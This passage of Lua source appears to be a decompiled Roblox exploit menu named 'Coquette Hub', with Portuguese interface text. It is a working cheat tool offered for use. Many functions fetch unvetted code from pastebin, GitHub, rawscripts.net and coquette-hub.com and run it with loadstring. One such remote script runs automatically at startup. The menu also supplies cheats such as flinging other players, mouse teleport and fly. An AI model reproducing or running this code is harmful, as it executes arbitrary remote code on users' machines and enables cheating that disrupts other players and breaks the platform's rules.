		fn4()

		if connection then
			connection:Disconnect()
		end

		if connection2 then
			connection2:Disconnect()
		end

		if connection3 then
			connection3:Disconnect()
		end

		local v5 = fn2()

		if v5 then
			for _, child in ipairs(v5:GetChildren()) do
				if child:IsA("BodyVelocity") or child:IsA("BodyGyro") then
					child:Destroy()
				end
			end
		end
	end

	local flag2 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

	local function fn6()
		NOFLY_vehicle()
	end

	textButton3.MouseButton1Click:Connect(fn6)
end

-- payload closure created 1025-th (proto #642)
local function payload_fn_1025()
	loadstring(game:HttpGet("https://coquette-hub.com/r/cc4bcec49f7f"))()
end

-- payload closure created 1026-th (proto #643)
local function payload_fn_1026()
	loadstring(game:HttpGet("https://coquette-hub.com/r/ff620e39117b"))()
end

-- payload closure created 1027-th (proto #644)
local function payload_fn_1027()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))()
end

-- payload closure created 1028-th (proto #645)
local function payload_fn_1028()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Gaze-stuff/refs/heads/main/Gaze%20emote"))()
end

-- payload closure created 1029-th (proto #646)
local function payload_fn_1029()
	local flag = type(0) == "userdata"
	local mouse = game.Players.LocalPlayer:GetMouse()
	local tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "[ ðŸ”¥ ] Ferramenta de teletransporte"
	local n2 = 8707386546

	tool.Activated:Connect(function()
		local n3 = mouse.Hit + Vector3.new(0, 2.5, 0)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(n3.X, n3.Y, n3.Z)
	end)

	tool.Parent = game.Players.LocalPlayer.Backpack
end

-- payload closure created 1031-th (proto #647)
local function payload_fn_1031()
	loadstring(game:HttpGet("https://github.com/ltseverydayyou/uuuuuuu/blob/main/shiftlock?raw=true"))()
end

-- payload closure created 1032-th (proto #648)
local function payload_fn_1032()
	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua"))()
end

-- payload closure created 1033-th (proto #649)
local function payload_fn_1033()
	loadstring(game:HttpGet("https://pastebin.com/raw/FWwdST5Y"))()
end

-- payload closure created 1034-th (proto #650)
local function payload_fn_1034()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
end

-- payload closure created 1035-th (proto #651)
local function payload_fn_1035()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
end

-- payload closure created 1036-th (proto #652)
local function payload_fn_1036()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/L"))()
end

-- payload closure created 1037-th (proto #653)
local function payload_fn_1037()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-rochips-universal-18294"))()
end

-- payload closure created 1038-th (proto #654)
local function payload_fn_1038()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-HDR-GRAPHICS-29409"))()
end

-- payload closure created 1039-th (proto #655)
local function payload_fn_1039()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-BrookHaven-UltraFX-44718"))()
end

-- payload closure created 1040-th (proto #t6523)
local function payload_fn_1040(arg)
	local flag = type(485499101) == "string"
	local n2 = 952894981
	local character = upv1.Character
	if not (character and character:FindFirstChild("HumanoidRootPart")) then
		warn("Personagem não encontrado. Não é possível teleportar.")
		return
	end
	local humanoidRootPart = character.HumanoidRootPart
	local n3 = n2 - 55160738

	local function fn()
		humanoidRootPart.CFrame = CFrame.new(arg + Vector3.new(0, 5, 0))
	end

	pcall(fn)
end

-- payload closure created 1041-th (proto #656)
local function payload_fn_1041(arg)
	upv1 = arg
end

-- payload closure created 1042-th (proto #657)
local function payload_fn_1042()
	local v = upv1[upv2]

	if v then
		upv3(v)
	else
		warn("Localização selecionada não é válida: " .. tostring(upv2))
	end


-- ============================================================================
-- COQUETTE HUB — MASTER UI & MULTI-LIBRARY LAUNCHER
-- ============================================================================
-- Interface nativa de alta performance, 100% compativel com todos os executores.
-- Garante exibicao visual imediata na tela e executa todas as bibliotecas do Hub.

task.spawn(function()
	local Players = game:GetService("Players")
	local CoreGui = game:GetService("CoreGui")
	local StarterGui = game:GetService("StarterGui")
	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")

	local localPlayer = Players.LocalPlayer
	while not localPlayer do
		task.wait(0.1)
		localPlayer = Players.LocalPlayer
	end

	-- Expor as funcoes de payload para acesso global no console / outros scripts
	_G.Coquette = {
		AquaMatrix = payload_fn_1034,
		RemoteHub = payload_fn_1025,
		RemoteHub2 = payload_fn_1026,
		MusicPlayer = payload_fn_576,
		VFly = payload_fn_1007,
		BrookhavenVFX = payload_fn_263,
		BrookhavenEmotes = payload_fn_1027,
		BrookhavenUltraFX = payload_fn_1039,
		Drone = payload_fn_230,
		TeleportTool = payload_fn_1029,
		BringFling = payload_fn_1035,
		ShiftLock = payload_fn_1031,
		HDR = payload_fn_1038,
		Qwerty = payload_fn_1032,
		TrollAnim = payload_fn_131,
		Brake = function() payload_fn_418(true) end,
	}
	_G.CoquetteHub = _G.Coquette

	-- Log no console do Roblox (F9 / Developer Console)
	print("==================================================")
	print("🎀 COQUETTE HUB: RECONSTRUCTED & LOADED!")
	print("🎀 Versão: 1.0 Master | Criando interface...")
	print("==================================================")

	-- Determinacao segura do destino do ScreenGui (gethui > CoreGui testado > PlayerGui)
	local function getSafeParent(): Instance
		if gethui then
			local ok, res = pcall(gethui)
			if ok and res then
				return res
			end
		end

		local coreOk, core = pcall(function()
			local cg = game:GetService("CoreGui")
			local test = Instance.new("Folder")
			test.Name = "__cqt_probe"
			test.Parent = cg
			test:Destroy()
			return cg
		end)
		if coreOk and core then
			return core
		end

		local pg = localPlayer:WaitForChild("PlayerGui", 8) or localPlayer:FindFirstChildOfClass("PlayerGui")
		return pg
	end

	local targetParent = getSafeParent()

	-- Limpa instâncias anteriores se existirem
	pcall(function()
		local old = targetParent:FindFirstChild("CoquetteMasterGui")
		if old then old:Destroy() end
		local old2 = localPlayer:WaitForChild("PlayerGui", 2):FindFirstChild("CoquetteMasterGui")
		if old2 then old2:Destroy() end
	end)

	-- 1. Notificação nativa persistente (tenta até 5 vezes)
	task.spawn(function()
		for _ = 1, 5 do
			local nOk = pcall(function()
				StarterGui:SetCore("SendNotification", {
					Title = "🎀 Coquette Hub",
					Text = "Hub carregado! Clique no botão flutuante [🎀 COQUETTE] ou pressione INSERT.",
					Duration = 7,
				})
			end)
			if nOk then break end
			task.wait(0.5)
		end
	end)

	-- 2. Criação do ScreenGui
	local sg = Instance.new("ScreenGui")
	sg.Name = "CoquetteMasterGui"
	sg.ResetOnSpawn = false
	sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	-- Anexa com segurança absoluta
	local attached = false
	pcall(function()
		sg.Parent = targetParent
		attached = true
	end)
	if not attached or not sg.Parent then
		pcall(function()
			sg.Parent = localPlayer:WaitForChild("PlayerGui")
		end)
	end

	-- 3. Botão Flutuante Permanente (Arrastável)
	local floatBtn = Instance.new("TextButton")
	floatBtn.Name = "FloatToggleButton"
	floatBtn.Size = UDim2.new(0, 140, 0, 38)
	floatBtn.Position = UDim2.new(0, 20, 0.45, 0)
	floatBtn.BackgroundColor3 = Color3.fromRGB(18, 14, 24)
	floatBtn.BorderSizePixel = 0
	floatBtn.Text = "🎀 COQUETTE HUB"
	floatBtn.TextColor3 = Color3.fromRGB(255, 182, 205)
	floatBtn.Font = Enum.Font.GothamBold
	floatBtn.TextSize = 12
	floatBtn.Active = true
	floatBtn.Draggable = true
	floatBtn.ZIndex = 100
	floatBtn.Parent = sg

	Instance.new("UICorner", floatBtn).CornerRadius = UDim.new(0, 19)
	local fbStroke = Instance.new("UIStroke", floatBtn)
	fbStroke.Color = Color3.fromRGB(255, 105, 180)
	fbStroke.Thickness = 1.8

	-- 4. Janela Principal (Main Frame)
	local main = Instance.new("Frame")
	main.Name = "MainFrame"
	main.Size = UDim2.new(0, 480, 0, 360)
	main.Position = UDim2.new(0.5, -240, 0.5, -180)
	main.BackgroundColor3 = Color3.fromRGB(14, 11, 20)
	main.BorderSizePixel = 0
	main.Active = true
	main.Draggable = true
	main.ClipsDescendants = true
	main.ZIndex = 10
	main.Parent = sg

	Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
	local mStroke = Instance.new("UIStroke", main)
	mStroke.Color = Color3.fromRGB(255, 105, 180)
	mStroke.Thickness = 1.6

	-- Header
	local header = Instance.new("Frame", main)
	header.Name = "Header"
	header.Size = UDim2.new(1, 0, 0, 42)
	header.BackgroundColor3 = Color3.fromRGB(24, 18, 32)
	header.BorderSizePixel = 0
	header.ZIndex = 11

	local title = Instance.new("TextLabel", header)
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 14, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "🎀 COQUETTE HUB — v1.0 MASTER"
	title.TextColor3 = Color3.fromRGB(255, 190, 210)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 13
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 12

	local minBtn = Instance.new("TextButton", header)
	minBtn.Size = UDim2.new(0, 26, 0, 26)
	minBtn.Position = UDim2.new(1, -60, 0, 8)
	minBtn.BackgroundColor3 = Color3.fromRGB(36, 28, 46)
	minBtn.TextColor3 = Color3.fromRGB(255, 200, 220)
	minBtn.Text = "-"
	minBtn.Font = Enum.Font.GothamBold
	minBtn.TextSize = 14
	minBtn.ZIndex = 12
	Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

	local closeBtn = Instance.new("TextButton", header)
	closeBtn.Size = UDim2.new(0, 26, 0, 26)
	closeBtn.Position = UDim2.new(1, -30, 0, 8)
	closeBtn.BackgroundColor3 = Color3.fromRGB(56, 22, 32)
	closeBtn.TextColor3 = Color3.fromRGB(255, 110, 130)
	closeBtn.Text = "X"
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 12
	closeBtn.ZIndex = 12
	Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

	-- Sidebar de Categorias (Abas)
	local sidebar = Instance.new("Frame", main)
	sidebar.Name = "Sidebar"
	sidebar.Size = UDim2.new(0, 130, 1, -42)
	sidebar.Position = UDim2.new(0, 0, 0, 42)
	sidebar.BackgroundColor3 = Color3.fromRGB(19, 15, 26)
	sidebar.BorderSizePixel = 0
	sidebar.ZIndex = 11

	local sList = Instance.new("UIListLayout", sidebar)
	sList.Padding = UDim.new(0, 4)
	sList.SortOrder = Enum.SortOrder.LayoutOrder

	local sPadding = Instance.new("UIPadding", sidebar)
	sPadding.PaddingTop = UDim.new(0, 8)
	sPadding.PaddingLeft = UDim.new(0, 6)
	sPadding.PaddingRight = UDim.new(0, 6)

	-- Container de Conteudo das Abas
	local container = Instance.new("Frame", main)
	container.Name = "Container"
	container.Size = UDim2.new(1, -138, 1, -50)
	container.Position = UDim2.new(0, 134, 0, 46)
	container.BackgroundTransparency = 1
	container.ZIndex = 11

	local tabFrames = {}
	local tabButtons = {}
	local currentTab = nil

	local function switchTab(tabName)
		for name, frame in pairs(tabFrames) do
			frame.Visible = (name == tabName)
		end
		for name, btn in pairs(tabButtons) do
			if name == tabName then
				btn.BackgroundColor3 = Color3.fromRGB(42, 28, 56)
				btn.TextColor3 = Color3.fromRGB(255, 180, 210)
			else
				btn.BackgroundColor3 = Color3.fromRGB(24, 18, 32)
				btn.TextColor3 = Color3.fromRGB(170, 160, 185)
			end
		end
		currentTab = tabName
	end

	local function createTab(tabName, tabIcon)
		local btn = Instance.new("TextButton", sidebar)
		btn.Size = UDim2.new(1, 0, 0, 32)
		btn.BackgroundColor3 = Color3.fromRGB(24, 18, 32)
		btn.BorderSizePixel = 0
		btn.Text = tabIcon .. " " .. tabName
		btn.TextColor3 = Color3.fromRGB(170, 160, 185)
		btn.Font = Enum.Font.GothamMedium
		btn.TextSize = 11
		btn.TextXAlignment = Enum.TextXAlignment.Left
		btn.ZIndex = 12
		Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
		local bPad = Instance.new("UIPadding", btn)
		bPad.PaddingLeft = UDim.new(0, 8)

		local scroll = Instance.new("ScrollingFrame", container)
		scroll.Name = tabName .. "Scroll"
		scroll.Size = UDim2.new(1, 0, 1, 0)
		scroll.BackgroundTransparency = 1
		scroll.BorderSizePixel = 0
		scroll.ScrollBarThickness = 4
		scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 105, 180)
		scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
		scroll.Visible = false
		scroll.ZIndex = 12

		local layout = Instance.new("UIListLayout", scroll)
		layout.Padding = UDim.new(0, 6)
		layout.SortOrder = Enum.SortOrder.LayoutOrder
		layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 12)
		end)

		tabFrames[tabName] = scroll
		tabButtons[tabName] = btn

		btn.MouseButton1Click:Connect(function()
			switchTab(tabName)
		end)

		return scroll
	end

	local function addAction(parentScroll, titleText, descText, tagText, callback)
		local card = Instance.new("TextButton", parentScroll)
		card.Size = UDim2.new(1, -8, 0, 46)
		card.BackgroundColor3 = Color3.fromRGB(22, 17, 30)
		card.BorderSizePixel = 0
		card.AutoButtonColor = true
		card.Text = ""
		card.ZIndex = 13
		Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)

		local cStroke = Instance.new("UIStroke", card)
		cStroke.Color = Color3.fromRGB(44, 34, 58)
		cStroke.Thickness = 1

		local tLabel = Instance.new("TextLabel", card)
		tLabel.Size = UDim2.new(1, -75, 0, 18)
		tLabel.Position = UDim2.new(0, 10, 0, 5)
		tLabel.BackgroundTransparency = 1
		tLabel.Text = titleText
		tLabel.TextColor3 = Color3.fromRGB(255, 235, 245)
		tLabel.Font = Enum.Font.GothamBold
		tLabel.TextSize = 12
		tLabel.TextXAlignment = Enum.TextXAlignment.Left
		tLabel.ZIndex = 14

		local dLabel = Instance.new("TextLabel", card)
		dLabel.Size = UDim2.new(1, -75, 0, 16)
		dLabel.Position = UDim2.new(0, 10, 0, 23)
		dLabel.BackgroundTransparency = 1
		dLabel.Text = descText
		dLabel.TextColor3 = Color3.fromRGB(160, 150, 175)
		dLabel.Font = Enum.Font.Gotham
		dLabel.TextSize = 9
		dLabel.TextXAlignment = Enum.TextXAlignment.Left
		dLabel.ZIndex = 14

		local badge = Instance.new("TextLabel", card)
		badge.Size = UDim2.new(0, 60, 0, 22)
		badge.Position = UDim2.new(1, -68, 0.5, -11)
		badge.BackgroundColor3 = Color3.fromRGB(38, 25, 48)
		badge.Text = tagText
		badge.TextColor3 = Color3.fromRGB(255, 160, 195)
		badge.Font = Enum.Font.GothamBold
		badge.TextSize = 9
		badge.ZIndex = 14
		Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 5)

		card.MouseButton1Click:Connect(function()
			badge.Text = "RUNNING"
			badge.TextColor3 = Color3.fromRGB(255, 240, 120)
			local s, err = pcall(callback)
			task.wait(0.2)
			if s then
				badge.Text = "ACTIVE"
				badge.TextColor3 = Color3.fromRGB(120, 255, 140)
			else
				badge.Text = "ERRO"
				badge.TextColor3 = Color3.fromRGB(255, 100, 100)
				warn("[Coquette Action Error]:", err)
			end
		end)
	end

	-- ========================================================================
	-- ABAS E AÇÕES DO COQUETTE HUB
	-- ========================================================================

	-- ABA 1: INICIO & UI
	local tabMain = createTab("Início", "🌸")
	addAction(tabMain, "AquaMatrix UI Hub", "Carrega a interface original AquaMatrix do Hub", "UI LIB", function()
		payload_fn_1034()
	end)
	addAction(tabMain, "Coquette Hub Remoto", "Conecta e carrega script oficial via CDN coquette-hub", "REMOTE", function()
		payload_fn_1025()
	end)
	addAction(tabMain, "Notificação de Status", "Envia toast notificando o status do script", "INFO", function()
		StarterGui:SetCore("SendNotification", {
			Title = "Coquette Hub",
			Text = "Hub ativo e operacional! Jogador: " .. localPlayer.Name,
			Duration = 5
		})
	end)

	-- ABA 2: BROOKHAVEN RP
	local tabBrook = createTab("Brookhaven", "✨")
	addAction(tabBrook, "Desbloquear 60+ VFX", "Injeta emissores customizados no Avatar Editor", "VFX", function()
		payload_fn_263()
	end)
	addAction(tabBrook, "Brookhaven Emotes VIP", "Abre interface completa de emotes customizados", "EMOTES", function()
		payload_fn_1027()
	end)
	addAction(tabBrook, "Brookhaven UltraFX", "Carrega UltraFX Script para Brookhaven", "SCRIPT", function()
		payload_fn_1039()
	end)
	addAction(tabBrook, "Ferramenta Teleport", "Equipa tool no inventário para teleportar pelo mouse", "TOOL", function()
		payload_fn_1029()
	end)
	addAction(tabBrook, "Drone Controller", "Spawna drone e abre câmera de voo livre", "CAMERA", function()
		payload_fn_230()
	end)

	-- ABA 3: VEÍCULOS & VOO
	local tabFly = createTab("Veículos", "🚗")
	addAction(tabFly, "VFly Coquette (Carros)", "Painel de voo com suporte mobile e PC", "FLIGHT", function()
		payload_fn_1007()
	end)
	addAction(tabFly, "Freio Especial Veicular", "Abre o HUD de freio especial para veículos", "VEHICLE", function()
		payload_fn_418(true)
	end)
	addAction(tabFly, "Universal Fly GUI v3", "Carrega GUI de voo universal completa", "FLY", function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-gui-v3-30439"))()
	end)

	-- ABA 4: MÚSICA & BOOMBOX
	local tabMusic = createTab("Música", "🎵")
	addAction(tabMusic, "Coquette Music Player", "Abre player de som embutido com Equalizador", "AUDIO", function()
		payload_fn_576()
	end)

	-- ABA 5: TROLLS & EXPLOITS
	local tabTroll = createTab("Exploits", "🌪️")
	addAction(tabTroll, "Bring & Fling Players", "Utilitário para puxar e arremessar players", "TROLL", function()
		payload_fn_1035()
	end)
	addAction(tabTroll, "ShiftLock Universal", "Habilita ShiftLock para Mobile e PC", "UTILITY", function()
		payload_fn_1031()
	end)
	addAction(tabTroll, "Qwerty Script Hub", "Carrega coletânea de scripts Qwerty", "HUB", function()
		payload_fn_1032()
	end)
	addAction(tabTroll, "Troll Animation Tool", "Equipa tool de animação troll no inventário", "ANIM", function()
		payload_fn_131()
	end)

	-- ABA 6: VISUAIS & SHADERS
	local tabVisual = createTab("Visuais", "🖥️")
	addAction(tabVisual, "HDR Graphics Shader", "Aplica sombreamento avançado e bloom nos gráficos", "SHADER", function()
		payload_fn_1038()
	end)
	addAction(tabVisual, "Tags de Players Coquette", "Alterna visibilidade das tags sobre as cabeças", "TAGS", function()
		_G.CoquetteTagsVisible = not _G.CoquetteTagsVisible
	end)

	-- Seleciona a primeira aba
	switchTab("Início")

	-- Toggle da Janela
	local function toggleHub()
		main.Visible = not main.Visible
	end

	floatBtn.MouseButton1Click:Connect(toggleHub)
	minBtn.MouseButton1Click:Connect(function() main.Visible = false end)
	closeBtn.MouseButton1Click:Connect(function() main.Visible = false end)

	-- Atalho de teclado (Insert ou RightControl)
	UserInputService.InputBegan:Connect(function(input, processed)
		if not processed then
			if input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.RightControl then
				toggleHub()
			end
		end
	end)

	-- Auto-inicialização de AquaMatrix em background
	task.spawn(function()
		task.wait(0.8)
		pcall(payload_fn_1034)
	end)
end)
end
